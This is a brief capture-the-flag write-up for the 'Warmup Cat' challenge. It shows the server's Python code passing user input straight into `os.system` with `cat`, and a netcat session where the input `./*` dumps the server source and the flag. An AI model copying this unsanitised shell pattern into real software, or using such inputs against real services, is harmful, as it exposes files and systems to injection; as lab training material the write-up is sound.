# Warmup Cat :cat:

### Description:

* https://imgur.com/a/NAuGuop os.system(('\\cat ' + user_input_olddie_eol))

### Challenge:

As the description says, it just executes:

```python
os.system(('\\cat ' + user_input_olddie_eol))
```

We don't know the name of the flag, so why don't just `cat` the whole directory?

```sh
w3th4nds@void:~/ctfs/ENISA_hackfest_2020/misc/warmup_cat$ nc 34.107.89.145 30993
Exec: "./*"
"./*"
python server.pyimport os
Niswanob1=input('Exec: ')
os.system(('\\cat ' + Niswanob1))

# ctf{c7592e4a8e0b395cb2c0b661c567a8c9eb2bcbeea9c79c08b722914d2b5e3a55}^C
```



# 
